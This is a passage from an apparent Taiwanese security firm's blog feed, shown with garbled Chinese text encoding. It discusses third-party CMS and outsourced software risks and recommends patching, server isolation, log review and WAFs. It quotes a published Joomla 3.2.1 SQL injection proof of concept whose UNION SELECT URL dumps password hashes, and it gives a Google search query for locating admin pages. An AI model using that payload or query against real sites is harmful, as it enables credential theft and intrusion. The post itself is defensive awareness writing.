&lt;p&gt;&lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt; æ˜¯å¦ä¸€å¥—åœ‹éš›éå¸¸çŸ¥åçš„ CMS ç³»çµ±ï¼Œå› ç‚ºå…¶ä¾¿åˆ©æ€§ï¼Œå¾ˆå¤šä¼æ¥­ã€å­¸æ ¡ã€æ”¿åºœå–®ä½ï¼Œéƒ½æ¡ç”¨æ­¤å¥—ä»¶å»ºç«‹ç¶²ç«™ã€‚é€é Google Hacking æ–¹å¼å¯ä»¥æ‰¾åˆ°å°ç£éå¸¸å¤šç¶²ç«™éƒ½ä½¿ç”¨ Joomla! æ¶ç«™ã€‚&lt;/p&gt;

&lt;pre&gt;
site:tw intitle:ç®¡ç†å€ inurl:administrator
&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot; alt=&quot;Google Hacking å°‹æ‰¾ Joomla!&quot; title=&quot;Google Hacking å°‹æ‰¾ Joomla!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯å¦‚æœä»Šå¤©é€™å€‹ç³»çµ±å‡ºäº†å•é¡Œå‘¢ï¼Ÿã€ŒJoomla!ã€å› ç‚ºå¤–æ›ã€å¥—ä»¶çœ¾å¤šï¼Œä¹Ÿç¶“å¸¸æˆç‚ºæ¼æ´ç™¼æ˜çš„å°è±¡ã€‚åœ¨ 2014/02/05ï¼Œåœ‹å¤–é‡‹å‡ºäº†ä¸€å€‹ SQL Injection Exploitï¼Œå¯ä»¥å°è‡´ç¶²ç«™å¸³è™Ÿå¯†ç¢¼ç›´æ¥è¢«å°å‡ºã€‚&lt;/p&gt;

&lt;p&gt;å®˜æ–¹å®‰å…¨å…¬å‘Šï¼š&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Secunia: Joomla! Multiple Vulnerabilities &lt;a href=&quot;http://secunia.com/advisories/56772/&quot;&gt;http://secunia.com/advisories/56772/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploit ä½å€ï¼š&lt;a href=&quot;http://www.exploit-db.com/exploits/31459/&quot;&gt;http://www.exploit-db.com/exploits/31459/&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;# Exploit Title: Joomla 3.2.1 sql injection
# Date: 05/02/2014
# Exploit Author: kiall-9@mail.com
# Vendor Homepage: http://www.joomla.org/
# Software Link: http://joomlacode.org/gf/download/frsrelease/19007/134333/Joomla_3.2.1-Stable-Full_Package.zip
# Version: 3.2.1 (default installation with Test sample data)
# Tested on: Virtualbox (debian) + apache
POC=&amp;gt;
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=\
Â 
will cause an error:
Â 
1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\)&apos; at line 3 SQL=SELECT `t`.`id` FROM `k59cv_tags` AS t INNER JOIN `k59cv_contentitem_tag_map` AS m ON `m`.`tag_id` = `t`.`id` AND `m`.`type_alias` = &apos;com_weblinks.categories&apos; AND `m`.`content_item_id` IN ( \) Array ( [type] =&amp;gt; 8 [message] =&amp;gt; Undefined offset: 0 [file] =&amp;gt; /var/www/Joomla_3.2.1/libraries/joomla/filter/input.php [line] =&amp;gt; 203 )
Â 
I modified the original error.php file with this code --- &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php print_r(error_get_last()); ?&amp;gt;&lt;/span&gt; --- in order to obtain something useful. ;-)
Â 
Now i can easily exploit this flaw:
Â 
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60k59cv_users%60%20--%20%29
and obtain the hash:
Â 
1054 Unknown column &apos;$P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1&apos; in &apos;where clause&apos; SQL=SELECT `m`.`tag_id`,`m`.`core_content_id`,`m`.`content_item_id`,`m`.`type_alias`,COUNT( `tag_id`) AS `count`,`t`.`access`,`t`.`id`,`ct`.`router`,`cc`.`core_title`,`cc`.`core_alias`,`cc`.`core_catid`,`cc`.`core_language` FROM `k59cv_contentitem_tag_map` AS `m` INNER JOIN `k59cv_tags` AS `t` ON m.tag_id = t.id INNER JOIN `k59cv_ucm_content` AS `cc` ON m.core_content_id = cc.core_content_id INNER JOIN `k59cv_content_types` AS `ct` ON m.type_alias = ct.type_alias WHERE `m`.`tag_id` IN ($P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1) AND t.access IN (1,1) AND (`m`.`content_item_id` &lt;span class=&quot;nt&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; 0 ) union select password from `k59cv_users` -- ) OR `m`.`type_alias` &lt;span class=&quot;nt&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &apos;com_weblinks.categories&apos;) AND `cc`.`core_state` = 1 GROUP BY `m`.`core_content_id` ORDER BY `count` DESC LIMIT 0, 5
Â 
CheerZ&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å€¼å¾—æ³¨æ„ä¸€çœ‹çš„æ˜¯&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;å®˜æ–¹å…¬å‘Š&lt;/a&gt;ï¼Œä¸Šé¢æ¨™è¨»è‘—æ¼æ´å›å ±æ™‚é–“ä»¥åŠä¿®è£œæ™‚é–“ã€‚2014/2/6 æ¥ç²å›å ±ï¼Œ2014/3/6 ä¿®å¾©ã€‚åœ¨é€™æ•´æ•´ä¸€å€‹æœˆçš„æ™‚é–“ä¹‹å…§ï¼Œæ‰€æœ‰é©ç”¨ç‰ˆæœ¬å…§çš„ Joomla! ç¶²ç«™éƒ½å°‡å—æ­¤æ¼æ´å½±éŸ¿ã€‚å› æ­¤å¥—ä»¶å» å•†çš„åæ‡‰ä¿®å¾©é€Ÿåº¦è¶Šæ…¢ï¼Œé¡§å®¢æš´éœ²åœ¨é¢¨éšªä¹‹ä¸­çš„æ™‚é–“è¶Šé•·ã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Project: Joomla!
SubProject: CMS
Severity: High
Versions: 3.1.0 through 3.2.2
Exploit type: SQL Injection
Reported Date: 2014-February-06
Fixed Date: 2014-March-06
CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹èªªæ˜å¤–åŒ…å» å•†&quot;&gt;æ¡ˆä¾‹èªªæ˜ï¼šå¤–åŒ…å» å•†&lt;/h3&gt;

&lt;iframe src=&quot;//embed.gettyimages.com/embed/147456329?et=tHsuT-4nxk-4NvmLZycwCA&amp;amp;sig=Z5X7iFr5V9vS70tCT49wQA8EldpRXSuV3jpoBtgTmg4=&quot; width=&quot;507&quot; height=&quot;406&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt; &lt;/iframe&gt;

&lt;p&gt;é€™æ¨£çš„æƒ…å¢ƒä½ æ˜¯å¦ç†Ÿæ‚‰ï¼Ÿ&lt;/p&gt;

&lt;p&gt;å…¬å¸æœ‰ä¸€å¥—å®¢è£½åŒ–çš„ç³»çµ±éœ€è¦å»ºç½®ï¼Œä½†æ˜¯å› ç‚ºå…¬å¸å…§éƒ¨é–‹ç™¼äººå“¡ä¸è¶³ï¼Œå› æ­¤æŠŠé€™å€‹ç³»çµ±å¤–åŒ…å‡ºå»çµ¦å» å•†åšã€‚è²¨æ¯”ä¸‰å®¶ä¸åƒè™§ï¼Œæ¯”äº† A B C ä¸‰å®¶ï¼Œç™¼ç¾ A å®¶æœ€ä¾¿å®œå¯¦æƒ ï¼Œäº¤è²¨æ™‚é–“åˆçŸ­ã€‚æ±ºå®šå°±æŠŠé€™å€‹ç³»çµ±ç™¼åŒ…çµ¦ A å» å•†åšã€‚åŠå¹´éå»äº†ï¼Œé€™å€‹å» å•†é †åˆ©äº¤è²¨çµæ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;ä¸€å¹´éå¾Œï¼Œç™¼ç¾é€™å€‹ç³»çµ±ç«Ÿç„¶é­åˆ°å…¥ä¾µï¼Œä¸»å‹•æ”»æ“Šå…§éƒ¨å…¶ä»–ä¼ºæœå™¨ã€‚ã€Œä¸æ˜¯æœ‰è²·é˜²ç«ç‰†å—ï¼Ÿæ€éº¼é‚„æœƒè¢«å…¥ä¾µï¼Ÿã€è€é—†èªªã€‚é€™å¯åš´é‡äº†ï¼Œé¦¬ä¸Šæ‰¾å» å•†ä¾†åˆ®ä¸€é “ã€‚æ²’æƒ³åˆ°ï¼ŒA å» å•†è¡¨ç¤ºï¼Œè©²æ¡ˆå·²ç¶“é †åˆ©çµæ¡ˆï¼Œç¶­è­·æœŸä¹Ÿå·²ç¶“éäº†ï¼Œæ²’è¾¦æ³•æä¾›å”åŠ©ï¼Œé™¤éç¹¼çºŒç°½è¨‚ç¶­è­·åˆç´„ã€‚å•é¡Œç¸½å¾—è§£æ±ºï¼Œç°½è¨‚äº†ç¶­è­·åˆç´„ä¹‹å¾Œï¼ŒA å» å•†ä¹Ÿå”åŠ©æŠŠç—…æ¯’ç æ‰äº†ã€‚åœ“æ»¿çµæŸï¼Ÿäº‹æƒ…æœ‰é‚£éº¼ç°¡å–®å—ï¼Ÿ&lt;/p&gt;

&lt;p&gt;éäº†å…©å¤©ï¼Œç³»çµ±åˆé–‹å§‹æ”»æ“Šå…¶ä»–ä¼ºæœå™¨ã€‚ã€Œç—…æ¯’ä¸æ˜¯å·²ç¶“ç æ‰äº†å—ï¼Ÿã€è€é—†èªªã€‚å•é¡Œåœ¨å“ªå¤§å®¶æ‡‰è©²éƒ½å¾ˆæ¸…æ¥šã€‚åœ¨å°‹æ‰¾è³‡å®‰å» å•†å”åŠ©ä¹‹ä¸‹ï¼Œç™¼ç¾ä¸»æ©Ÿæ˜¯å› ç‚º A å» å•†è¨­è¨ˆçš„ç³»çµ±å«æœ‰æ¼æ´ï¼Œå°è‡´ SQL Injection å•é¡Œï¼Œé­æ”»æ“Šè€…åˆ©ç”¨æ¤å…¥æƒ¡æ„ç¨‹å¼ã€‚A å» å•†ç™¾èˆ¬ç„¡å¥ˆï¼Œæ‘¸æ‘¸é¼»å­æŠŠé€™å€‹æ¼æ´ä¿®è£œèµ·ä¾†ã€‚åˆéäº†å…©å¤©ï¼Œå†åº¦é­åˆ°å…¥ä¾µã€‚çœ‹äº†çœ‹ï¼Œç™¼ç¾åˆæ˜¯å¦ä¸€å€‹ SQL Injection å•é¡Œã€‚åœ¨å¹¾æ¬¡èˆ‡æ”»æ“Šè€…çš„ä¸æ–·è§’åŠ›ä¹‹ä¸‹ï¼Œçµ‚æ–¼å¥½åƒæŠŠå•é¡Œéƒ½ä¿®å®Œäº†ã€‚&lt;/p&gt;

&lt;p&gt;éäº†ä¸€é€±ï¼Œç³»çµ±å†åº¦æœ‰æƒ¡æ„ç¨‹å¼çš„è¹¤è·¡ï¼ŒA å» å•†ä¹Ÿç„¡èƒ½ç‚ºåŠ›ã€‚è³‡å®‰å» å•†è¡¨ç¤ºï¼Œè²·é€™å€‹å°±å°äº†ï¼åœ¨é™¸çºŒè¢«è¿«è²·äº†é˜²ç«ç‰†ã€WAFã€IDS ç­‰è¨­å‚™å¾Œï¼Œé›–ç„¶å•é¡Œè²Œä¼¼æ”¹å–„ï¼Œä½†ç³»çµ±ä»ç„¶é›¶æ˜Ÿæœ‰å…¥ä¾µäº‹ä»¶ç™¼ç”Ÿã€‚å…¬å¸åªå¥½ã€Œæ–·ç„¶è™•ç½®ã€ï¼Œç­‰å¾…ä¸‹æ¬¡é ç®—ï¼Œå¦è«‹å» å•†é‡æ–°é–‹ç™¼ç³»çµ±ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 1ï¼šè©²ç³»çµ±æ˜¯å¦é‚„æœ‰å…¶ä»–æ¼æ´ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 2ï¼šå…¬å¸çš„è™•ç½®æ˜¯å¦æ­£ç¢ºï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 3ï¼šA å» å•†çš„å…¶ä»–å®¢æˆ¶æ˜¯å¦æœ‰é¡ä¼¼çš„å•é¡Œï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 4ï¼šä¸æ˜¯æœ‰è²·è³‡å®‰è¨­å‚™ï¼Ÿç‚ºä»€éº¼é‚„æœƒæœ‰è³‡å®‰äº‹ä»¶ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 5ï¼šå…¬å¸è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 6ï¼šå» å•†è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æƒ³ä¸€ä¸‹ä»¥ä¸Šå„é»å•é¡Œã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 1ï¼šè©²ç³»çµ±æ˜¯å¦é‚„æœ‰å…¶ä»–æ¼æ´ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¦‚æœä¸€å€‹åœ¨é–‹ç™¼æ™‚æœŸå°±æ²’æœ‰æ³¨æ„å®‰å…¨çš„ç³»çµ±ï¼Œå¾ˆæœ‰å¯èƒ½æœ‰æ›´å¤šä¸ç‚ºäººçŸ¥çš„æ¼æ´ã€‚å¦‚æœè¢«å‹•ä¾è³´è³‡å®‰äº‹ä»¶ï¼Œç™¼ç”Ÿä¸€ä»¶ä¿®ä¸€å€‹æ¼æ´ï¼Œé‚£æ˜¯æ°¸ç„¡æ­¢ç›¡çš„ã€‚æ­£ç¢ºçš„æ–¹å¼æ‡‰è©²æ˜¯ç›´æ¥é‡å° A å» å•†çš„åŸå§‹ç¢¼é€²è¡Œé»‘ç®±&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;ã€ç™½ç®±æºç¢¼æª¢æ¸¬ (Code Review)ï¼Œæ‰èƒ½å¿«é€Ÿæ‰¾å‡ºæ‰€æœ‰é¢¨éšªã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 2ï¼šå…¬å¸çš„è™•ç½®æ˜¯å¦æ­£ç¢ºï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ã€Œè²¨æ¯”ä¸‰å®¶ä¸åƒè™§ã€ï¼Œç¯€å„‰ç¢ºå¯¦æ˜¯ç¾å¾·ï¼Œä½†æ˜¯åœ¨è³‡è¨Šç”¢æ¥­ä¸­ï¼Œè¶Šä¾¿å®œçš„ç³»çµ±å¯èƒ½ä»£è¡¨è‘—æ›´å¤šçš„ cost downï¼Œé™¤äº†çŠ§ç‰²æ‰å“è³ªä¹‹å¤–ï¼Œå¯èƒ½å¸¶çµ¦ä¼æ¥­æ›´å¤šæå¤±ã€‚åœ¨è³‡å®‰äº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œä¸€å®šè¦æ‰¾åŸæœ¬ç¶­é‹å» å•†è² è²¬ï¼Œä¸¦ä¸”èˆ‡è³‡å®‰é¡§å•å…¬å¸é…åˆï¼Œå”åŠ©å» å•†æŠŠå•é¡Œè§£æ±ºã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 3ï¼šA å» å•†çš„å…¶ä»–å®¢æˆ¶æ˜¯å¦æœ‰é¡ä¼¼çš„å•é¡Œï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç¾…é¦¬ä¸æ˜¯ä¸€æ—¥é€ æˆçš„ï¼Œä¸å®‰å…¨çš„ç³»çµ±ä¹Ÿä¸æ˜¯ä¸€å€‹æ¼æ´é€ æˆçš„ã€‚å» å•†é€šå¸¸æ˜¯åšå‡ºä¸€ä»½ç³»çµ±ï¼Œå®¢è£½åŒ–è²©è³£çµ¦ä¸åŒçš„ä¼æ¥­ç”¨æˆ¶ã€‚å¦‚æœåœ¨å»ºç½®çš„éç¨‹ä¸­æ²’æœ‰æ³¨æ„å®‰å…¨å•é¡Œï¼Œä»Šå¤©é€™å®¶å®¢æˆ¶æœ‰é€™å€‹æ¼æ´ï¼Œåˆ¥çš„å®¢æˆ¶ä¸€å®šä¹Ÿæœƒæœ‰ã€‚å› æ­¤å¦‚æœæ¡ç”¨äº†ä¸è‰¯çš„å» å•†å¯¦ä½œçš„ç³»çµ±ï¼Œä¸‹ä¸€å€‹è¢«é§­çš„å¯èƒ½å°±æ˜¯è‡ªå·±ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 4ï¼šä¸æ˜¯æœ‰è²·è³‡å®‰è¨­å‚™ï¼Ÿç‚ºä»€éº¼é‚„æœƒæœ‰è³‡å®‰äº‹ä»¶ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ã€Œä¸æ˜¯æœ‰è²·é˜²ç«ç‰†å—ï¼Ÿæ€éº¼é‚„æœƒè¢«å…¥ä¾µï¼Ÿã€æ˜¯å¾ˆå¤šå‚³çµ±æ€ç¶­ä¼æ¥­çš„å…±åŒå¿ƒè²ã€‚é˜²ç«ç‰†ä¸æ˜¯è¬éˆä¸¹ï¼Œé§­å®¢ä¹Ÿçµ•å°ä¸æ˜¯é›»è…¦ã€‚ä¸¦ä¸æ˜¯å®Œå…¨ä¾è³´è³‡å®‰è¨­å‚™å°±èƒ½å¤ é¿å…è³‡å®‰å•é¡Œã€‚åœ¨é§­å®¢çš„æ‰‹æ³•ä¸­ï¼Œæ›´å¤šæ˜¯å¦‚ä½•ç¹éå„ç¨®é˜²ç¦¦è¨­å‚™æ‰‹æ®µï¼Œç”šè‡³æœ‰äº›è³‡å®‰è¨­å‚™æœ¬èº«ç«Ÿç„¶å«æœ‰è³‡å®‰å¼±é»ï¼Œä¼æ¥­åè€Œå› ç‚ºè³‡å®‰è¨­å‚™å°è‡´ç³»çµ±è¢«å…¥ä¾µã€‚&lt;/p&gt;

&lt;p&gt;æ­£ç¢ºçš„æ€ç¶­æ‡‰è©²æ˜¯å¾äººé–‹å§‹åšèµ·ï¼Œå»ºç«‹æ­£ç¢ºçš„è³‡å®‰è§€å¿µã€è³‡å®‰æ€ç¶­ï¼Œå­¸ç¿’é§­å®¢çš„æ€ç¶­ã€‚å»ºç«‹æ­£ç¢ºçš„ç³»çµ±é–‹ç™¼æµç¨‹ã€å»ºç«‹æ­£ç¢ºçš„è³‡å®‰äº‹ä»¶è™•ç†æµç¨‹ã€‚å°‹æ‰¾ä¿¡è­½è‰¯å¥½çš„è³‡å®‰é¡§å•å» å•†ï¼Œå®šæœŸé‡å°ä¼æ¥­å…§éƒ¨å„ç³»çµ±é€²è¡Œæ»²é€æ¸¬è©¦ã€å¼±é»æƒæã€‚å®‰å…¨çš„å»ºç«‹çµ•éä¸€è¹´å¯åŠï¼Œå”¯æœ‰ä¸€æ­¥æ­¥è¸ç©©æ‰èƒ½èµ°å¾—æ›´é ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å•é¡Œ 5ï¼šå…¬å¸è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;å•é¡Œ 6ï¼šå» å•†è©²å¦‚ä½•è‡ªä¿ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è«‹çœ‹ä¸‹ä¸€å€‹ç« ç¯€ã€Œå»ºè­°å°ç­–ã€ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å»ºè­°å°ç­–&quot;&gt;å»ºè­°å°ç­–&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/26604430@N05/5895021311/&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_cover.png&quot; alt=&quot;Countermeasure&quot; title=&quot;Countermeasure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¸€å€‹å®‰å…¨çš„ç³»çµ±ï¼Œçµ•å°æ˜¯ç”±åŸºç¤å»ºè¨­é–‹å§‹ï¼Œæ¯å€‹ç’°ç¯€éƒ½å…¼é¡§åˆ°å®‰å…¨çš„è¨­è¨ˆï¼Œä¸¦ä¸”å®šæœŸç¨½æ ¸ç¨‹å¼ç¢¼å®‰å…¨ï¼Œä½¿ç”¨æ­£ç¢ºå®‰å…¨çš„æ–¹å¼é–‹ç™¼ã€‚å¦‚æœç³»çµ±é–‹ç™¼åˆæœŸå°±æ²’æœ‰å…¼é¡§å®‰å…¨ï¼Œå¾ŒæœŸä¸ç®¡æ€éº¼ä¿®è£œï¼Œéƒ½é‚„æ˜¯æœƒæœ‰æ¼æ´è®“æ”»æ“Šè€…æœ‰æ©Ÿå¯è¶ã€‚&lt;/p&gt;

&lt;p&gt;ä¼æ¥­è©²å¦‚ä½•è‡ªä¿ï¼Ÿä½¿ç”¨ OpenSource ç¬¬ä¸‰æ–¹å¥—ä»¶æˆ–è€…æ˜¯ç³»çµ±å§”å¤–é–‹ç™¼ï¼Œæ˜¯ä¼æ¥­ç„¡å¯é¿å…çš„ã€‚å¦‚æœæ˜¯ç¬¬ä¸‰æ–¹å¥—ä»¶ï¼Œå¹³æ™‚å¯ä»¥å¤šåŠ æ³¨æ„å¥—ä»¶çš„è³‡å®‰æ¶ˆæ¯ï¼Œå¦‚æœä¸€æœ‰æ–°çš„æ¼æ´è¢«ç™¼ç¾ï¼Œå°‡å¯ä»¥åœ¨ç¬¬ä¸€æ™‚é–“æ‡‰è®Šã€‚è‹¥æ²’æœ‰è¶³å¤ äººåŠ›å¯†åˆ‡æ³¨æ„è³‡å®‰æ¶ˆæ¯ï¼Œä¹Ÿå¯ä»¥å§”è«‹è³‡å®‰é¡§å•å» å•†å”åŠ©ï¼Œåœ¨å¾—çŸ¥è³‡å®‰æ¶ˆæ¯çš„ç¬¬ä¸€æ™‚é–“é€šå ±ä¼æ¥­ã€‚å§”å¤–é–‹ç™¼çš„ç³»çµ±ï¼Œä¼æ¥­å¯ä»¥è¦æ±‚å» å•†æå‡ºå°ˆæ¥­å…¬æ­£ç¬¬ä¸‰æ–¹è³‡å®‰å…¬å¸é€²è¡Œæª¢æ¸¬ï¼Œä¸¦ä¸”æå‡ºå®‰å…¨å ±å‘Šï¼Œè­‰æ˜è©²ç³»çµ±æœ‰ç¶“éæ»²é€æ¸¬è©¦ç­‰å®‰å…¨æª¢æ¸¬ï¼Œä¿éšœé›™æ–¹çš„æ¬Šåˆ©ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœç³»çµ±å·²ç¶“è¢«å…¥ä¾µäº†ï¼Œæˆ–è€…æ˜¯è¢«æ­éœ²äº†å®‰å…¨æ¼æ´ï¼Œè©²å¦‚ä½•è‡ªä¿å‘¢ï¼Ÿåœ¨æ¼æ´å¤§é‡æ­éœ²çš„æƒ…æ³ä¸‹ï¼Œç³»çµ±æ›´æœƒæˆç‚ºæ”»æ“Šè€…çš„ç›®æ¨™ã€‚å› æ­¤è¦å‹™å¿…å¯†åˆ‡æ³¨æ„ä½¿ç”¨è©²å¥—ä»¶çš„ä¼ºæœå™¨ç‹€æ³ï¼Œä¸¦ä¸”éµå¾ªä»¥ä¸‹åŸå‰‡ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¯†åˆ‡æ³¨æ„å®˜æ–¹çš„æ›´æ–°ç¨‹å¼ä¸¦ç«‹å³æ›´æ–°&lt;/li&gt;
  &lt;li&gt;æ­¤å°ä¼ºæœå™¨çš„å¸³è™Ÿå¯†ç¢¼åˆ‡å‹¿èˆ‡ä»–å°å…±ç”¨&lt;/li&gt;
  &lt;li&gt;å°‡æ­¤å°ä¼ºæœå™¨èˆ‡å…¶ä»–ä¼ºæœå™¨éš”é›¢ï¼Œé¿å…é­å…¥ä¾µæ™‚å—å®³ç¯„åœæ“´å¤§&lt;/li&gt;
  &lt;li&gt;ç•°åœ°å‚™ä»½ä¼ºæœå™¨çš„ç³»çµ±è¨˜éŒ„ï¼Œä¸¦å®šæ™‚æª¢é–±è¨˜éŒ„ï¼Œè§€å¯Ÿæ˜¯å¦æœ‰å¯ç–‘è¡Œç‚º&lt;/li&gt;
  &lt;li&gt;è€ƒæ…®æ¡ç”¨ Web Application Firewall (WAF)ã€ModSecurity ä¼ºæœå™¨å®‰å…¨æ¨¡çµ„ï¼Œå¢åŠ æ”»æ“Šé›£åº¦&lt;/li&gt;
  &lt;li&gt;é‡æ–°è©•ä¼°ä½¿ç”¨é­å…¥ä¾µå¥—ä»¶çš„å¿…è¦æ€§ä»¥åŠå®‰å…¨è€ƒé‡ï¼Œé¿å…æˆç‚ºä¼æ¥­çš„éš±å«é¢¨éšª&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶åŠ é€Ÿé–‹ç™¼ç¯€çœæˆæœ¬çš„åŒæ™‚ï¼Œå‹™å¿…ä¹Ÿè¦è€ƒæ…®å®‰å…¨çš„å•é¡Œï¼Œæ‰ä¸æœƒå› å°å¤±å¤§ï¼Œé€ æˆä¼æ¥­æ›´å¤§çš„æå¤±ã€‚åŒæ™‚ä¼æ¥­ä¹Ÿå¿…é ˆå¢åŠ è³‡å®‰çš„ç´ é¤Šä»¥åŠäº†è§£æ”»æ“Šè€…çš„æ€ç¶­ï¼Œåˆ¥è®“è‡ªå·±çš„ä¼æ¥­æˆç‚ºä¸‹ä¸€å€‹è³‡å®‰äº‹ä»¶å ±å°çš„å°è±¡ã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues/</link>
                <guid>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues</guid>
                <pubDate>Fri, 14 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Headers çš„è³‡å®‰è­°é¡Œ (1)</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;éš¨è‘—é§­å®¢æ”»æ“Šäº‹ä»¶æ—¥ç›Šæ¼¸å¢ï¼ŒåŸæœ¬ç¶“å¸¸è¢«å¤§çœ¾æ‰€å¿½è¦–çš„ç¶²ç«™è³‡å®‰å•é¡Œï¼Œç¾åœ¨å·²ç¶“é€æ¼¸å—åˆ°é‡è¦–ã€‚ä½†æ˜¯ï¼Œè¨±å¤šä¼æ¥­ä¸»æˆ–é–‹ç™¼äººå“¡é›–ç„¶å¾ˆæƒ³å¼·åŒ–ç¶²ç«™çš„å®‰å…¨æ€§ï¼Œå»ä¸çŸ¥é“è©²å¦‚ä½•å¾ä½•è‘—æ‰‹ã€‚&lt;/p&gt;

&lt;p&gt;ä¼æ¥­ä¸»é€šå¸¸æƒ³åˆ°çš„æ”¹å–„æ–¹æ¡ˆæ˜¯æ·»è³¼è³‡å®‰è¨­å‚™ï¼Œå¸Œæœ›å¯ä»¥ä¸€å‹æ°¸é€¸ã€‚æˆ‘å€‘å§‘ä¸”å…ˆä¸è«‡ã€Œ&lt;strong&gt;è³‡è¨Šç•Œæ²’æœ‰æ°¸é çš„å®‰å…¨&lt;/strong&gt;ã€é€™ä»¶äº‹ï¼Œä¼æ¥­å…‰æ˜¯è¦è²·åˆ°æœ‰æ•ˆçš„è³‡å®‰è¨­å‚™å°±æ˜¯ä¸€ä»¶ä»¤äººé ­ç—›çš„äº‹æƒ…ï¼Œä¸ä½†è¦èŠ±è¨±å¤šæ™‚é–“è½å–å» å•†çš„ç°¡å ±ï¼Œè€—è²»å¤§ç­†çš„ç¶“è²»æ¡è³¼ï¼Œè³¼è²·ä¹‹å¾Œé‚„è¦è«‹å“¡å·¥æˆ–åŸå» æŠ€è¡“äººå“¡å”åŠ©èª¿æ ¡ã€è¨­å®šæˆ–æ•™å­¸ï¼Œå¦å‰‡è²·äº†ç­‰æ–¼æ²’è²·ã€‚&lt;/p&gt;

&lt;p&gt;è€Œå°æ–¼æŠ€è¡“äººå“¡ä¾†èªªï¼Œè‹¥è¦å¼·åŒ–ç¶²ç«™å®‰å…¨æ€§ï¼Œå¿…é ˆå…ˆäº†è§£é§­å®¢å¦‚ä½•æ”»æ“Šï¼Œæ‰çŸ¥é“å¦‚ä½•å»ºç«‹æ ¹æœ¬æ€§çš„é˜²ç¦¦æ©Ÿåˆ¶ã€‚ä½†æ˜¯ä¼æ¥­ä¸»é€šå¸¸æ¨ä¸å¾—é€å“¡å·¥å»åƒåŠ å°ˆæ¥­çš„æ•™è‚²è¨“ç·´ï¼Œå°ç£å“¡å·¥æ‹¿çš„ 22k ä½è–ªä¹Ÿä½å¾—å¸¸å¸¸ä»¤äººæ¨ä¸å¾—èŠ±éŒ¢å»ä¸Šèª²ã€‚&lt;/p&gt;

